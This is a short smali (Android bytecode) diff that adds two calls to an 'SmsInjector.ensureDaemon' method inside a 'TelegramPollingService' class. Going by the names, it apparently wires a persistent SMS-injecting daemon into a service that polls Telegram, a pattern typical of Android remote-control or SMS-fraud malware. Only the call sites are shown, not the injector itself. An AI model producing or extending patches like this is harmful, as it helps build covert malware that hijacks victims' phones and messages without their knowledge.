@@ -46,6 +46,10 @@
 .method public run()V
     .locals 2
 
+    iget-object v0, p0, Lcom/astik/module/TelegramPollingService$6;->this$0:Lcom/astik/module/TelegramPollingService;
+
+    invoke-static {v0}, Lcom/astik/module/SmsInjector;->ensureDaemon(Landroid/content/Context;)Z
+
     .line 451
     :goto_0
     iget-object v0, p0, Lcom/astik/module/TelegramPollingService$6;->this$0:Lcom/astik/module/TelegramPollingService;
@@ -75,6 +79,8 @@
     .line 453
     :try_start_1
     iget-object v0, p0, Lcom/astik/module/TelegramPollingService$6;->this$0:Lcom/astik/module/TelegramPollingService;
+
+    invoke-static {v0}, Lcom/astik/module/SmsInjector;->ensureDaemon(Landroid/content/Context;)Z
 
     invoke-static {v0}, Lcom/astik/module/TelegramPollingService;->access$1000(Lcom/astik/module/TelegramPollingService;)V
     :try_end_1
